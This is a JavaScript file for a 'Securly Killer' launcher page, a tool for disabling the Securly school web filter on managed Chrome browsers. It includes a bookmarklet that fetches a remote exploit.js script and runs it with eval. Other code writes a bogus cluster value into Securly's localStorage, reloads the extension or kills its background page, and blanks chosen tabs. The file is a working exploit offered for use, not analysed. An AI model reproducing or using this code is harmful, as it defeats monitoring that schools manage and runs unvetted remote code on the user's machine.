window.onload = function() {
  // Create the container div and add inner HTML content
  var container = document.createElement('div');
  container.id = "container";
  container.innerHTML = `
    <center><h1>Point Blank Swap Launcher</h1></center>
    <h2>――――――Securly Killer ――――――</h2>

    <div class="bookmarklet">
        <h3>Securly Killer</h3>
        <a class="button" href="javascript:void fetch('https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js').then(d=>d.text()).then(eval);">Securly Killer</a>
    </div>
    
    <h2>――― Change tab URL (about:blank) ―――</h2>
    <input id="url">
    <button id="change">Change tabs (Useless)</button>
    <p id="error"></p>
    <button id="reload">Reload extension (Useless)</button>
    <br>
    <p><i>This is strictly for removing Securly</i></p>

    <!-- Optional buttons for cachekill, hardkillrev, etc. -->
    <button id="cachekill">Cachekill</button>
    <button id="hardkillrev">Hardkill Rev</button>
    <button id="hardkill">Hardkill</button>
    <span id="eee">Toggle Links</span>
    <div id="links" style="display:none;">Links will appear here.</div>
  `;

  // Append the container to the body
  document.body.appendChild(container);

  // Utility function to get elements by ID
  function get(id) {
    return document.getElementById(id);
  }

  // Function to change the tab URL to about:blank
  function aboutBlankPage(url) {
    opener.chrome.tabs.query({ url: url }, (x) => {
      opener.chrome.tabs.update(x[0].id, { url: "about:blank" });
    });
  }

  // Event listener for the 'change' button
  const changeButton = get('change');
  if (changeButton) {
    changeButton.addEventListener('click', function() {
      const url = get('url').value;
      aboutBlankPage(url);
    });
  }

  // Event listener for the 'reload' button
  const reloadButton = get('reload');
  if (reloadButton) {
    reloadButton.addEventListener('click', function() {
      try {
        opener.chrome.extension.getBackgroundPage().location.reload();
        alert('Reloaded');
      } catch (e) {
        alert('Failed to reload: ' + e);
      }
    });
  }

  // Optional: Event listeners for additional buttons (cachekill, hardkillrev, etc.)
  const cachekillButton = get('cachekill');
  if (cachekillButton) {
    cachekillButton.addEventListener('click', function() {
      if (confirm("Reverting hard kill sometimes can fail. Use with caution.\nPress Ok to continue, cancel to cancel")) {
        localStorage.cluster = 'UNKNOWN_SCHOOL, 999999999999999999999999999';
        opener.chrome.extension.getBackgroundPage().location.reload();
        alert('Cache changed');
      }
    });
  }

  const hardkillrevButton = get('hardkillrev');
  if (hardkillrevButton) {
    hardkillrevButton.addEventListener('click', function() {
      localStorage.cluster = 'UNKNOWN_SCHOOL,0';
      opener.chrome.runtime.reload();
      alert('Reverted cache');
    });
  }

  const hardkillButton = get('hardkill');
  if (hardkillButton) {
    hardkillButton.addEventListener('click', function() {
      try {
        opener.chrome.extension.getBackgroundPage().close();
        alert('Killed background process');
      } catch (e) {
        alert(e);
      }
    });
  }

  // Event listener for toggling links visibility
  const eeeButton = get('eee');
  if (eeeButton) {
    eeeButton.addEventListener('click', function() {
      const links = get('links');
      if (links.style.display === "none") {
        links.style.display = "block";
      } else {
        links.style.display = "none";
      }
    });
  }
};
